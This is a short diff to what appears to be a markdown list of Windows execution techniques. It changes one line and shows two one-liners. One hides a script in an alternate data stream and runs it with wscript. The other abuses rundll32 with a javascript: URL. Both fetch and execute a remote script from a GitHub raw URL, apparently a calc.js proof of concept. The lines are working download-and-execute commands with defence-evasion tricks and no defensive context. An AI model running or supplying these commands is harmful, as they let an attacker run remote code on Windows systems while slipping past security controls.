@@ -5,7 +5,7 @@ wscript/cscript <br><br>
 <br>
 
 Alternate data streams method suggested by @yeyint_mth <br><br>
-`cmd.exe /c echo GetObject("script:https://raw.githubusercontent.com/sailay1996/misc-bin/master/calc.js") > %temp%\test.txt:hi.js && wscript.exe %temp%\test.txt:hi.js`
+`echo GetObject("script:https://raw.githubusercontent.com/sailay1996/misc-bin/master/calc.js") > %temp%\test.txt:hi.js && wscript.exe %temp%\test.txt:hi.js`
 
 rundll32<br><br>
 `rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/sailay1996/misc-bin/master/calc.js")`
